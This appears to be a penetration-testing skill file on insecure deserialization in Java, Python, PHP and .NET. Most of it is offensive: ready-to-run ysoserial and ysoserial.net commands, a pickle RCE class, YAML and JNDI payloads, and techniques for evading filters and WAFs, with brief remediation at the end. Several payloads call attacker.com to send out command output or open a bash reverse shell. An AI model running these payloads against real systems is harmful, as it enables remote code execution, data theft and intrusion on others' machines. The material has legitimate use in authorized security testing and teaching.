---
name: deserialization
description: Insecure deserialization leading to RCE, DoS, and authentication bypass
---

# Insecure Deserialization

## Attack Surface
- Java applications accepting serialized objects: RMI, JMX, JMS, custom protocols, HTTP parameters with base64-encoded objects
- Python applications using `pickle.loads()`, `yaml.load()`, or `shelve` on untrusted data
- PHP `unserialize()` on user-controlled input (cookies, POST parameters, session data)
- .NET applications using `BinaryFormatter`, `ObjectStateFormatter`, `SoapFormatter`, or `LosFormatter`

## Detection Techniques
- Look for magic bytes: Java `0xACED0005` (base64: `rO0AB`), .NET `AAEAAAD`, Python pickle `0x80`
- Identify base64-encoded blobs in cookies, hidden form fields, API parameters, and ViewState
- Test by modifying serialized data and observing error messages revealing deserialization stack traces
- Scan for known vulnerable libraries: Apache Commons Collections, Spring, Jackson with polymorphic typing
- Use DNS callback payloads to confirm blind deserialization (ysoserial URLDNS gadget)

## Common Payloads

```
# Java - ysoserial gadget chains
java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com/rce' | base64
java -jar ysoserial.jar CommonsCollections5 'ping -c1 attacker.com' | base64
java -jar ysoserial.jar CommonsCollections7 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' | base64
java -jar ysoserial.jar URLDNS 'http://attacker.dnsbin.com'  # DNS-only confirmation

# Java - Jackson polymorphic deserialization
["com.sun.rowset.JdbcRowSetImpl",{"dataSourceName":"ldap://attacker.com/obj","autoCommit":true}]

# Python pickle RCE
import pickle, base64, os
class Exploit:
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/$(whoami)',))
print(base64.b64encode(pickle.dumps(Exploit())))

# Python YAML RCE (PyYAML < 6.0 with yaml.load)
!!python/object/apply:os.system ['curl http://attacker.com']
!!python/object/new:subprocess.check_output [['id']]

# PHP unserialize - POP chain example
O:8:"Gadget":1:{s:4:"cmd";s:2:"id";}
# PHP phar:// deserialization trigger
phar://uploads/evil.phar/test.txt

# .NET BinaryFormatter
ysoserial.net -f BinaryFormatter -g TypeConfuseDelegate -c "cmd /c ping attacker.com"
ysoserial.net -f ObjectStateFormatter -g ActivitySurrogateSelector -c "calc"
# .NET ViewState (when machineKey is known)
ysoserial.net -p ViewState -g TextFormattingRunProperties -c "cmd /c whoami" --validationalg="SHA1" --validationkey="KEY"
```

## Bypass Techniques
- Use alternative gadget chains when specific libraries are blacklisted (e.g., CommonsCollections1-7, BeanShell, Groovy)
- Wrap payloads in nested serialization layers to bypass shallow signature scanning
- For Java: use JNDI injection via `ldap://` or `rmi://` to load remote classes bypassing local class filters
- For PHP: use `phar://` wrapper to trigger deserialization without directly calling `unserialize()`
- Encode/compress serialized data (gzip, base64, URL encoding) to evade WAF pattern matching

## Exploit Chaining
- Deserialization to RCE: most gadget chains directly execute OS commands or load remote code
- Deserialization to auth bypass: manipulate serialized session objects to escalate privileges or impersonate users
- Deserialization to SSRF/file read: use intermediate gadgets to make HTTP requests or read filesystem before full RCE

## Remediation
- Never deserialize untrusted data; use safe formats like JSON with strict schemas instead
- Implement deserialization filters: Java `ObjectInputFilter` (JEP 290), .NET `SerializationBinder` allowlists
- Remove dangerous gadget libraries from the classpath or upgrade to patched versions
- Use HMAC signatures on serialized data to detect tampering before deserialization occurs
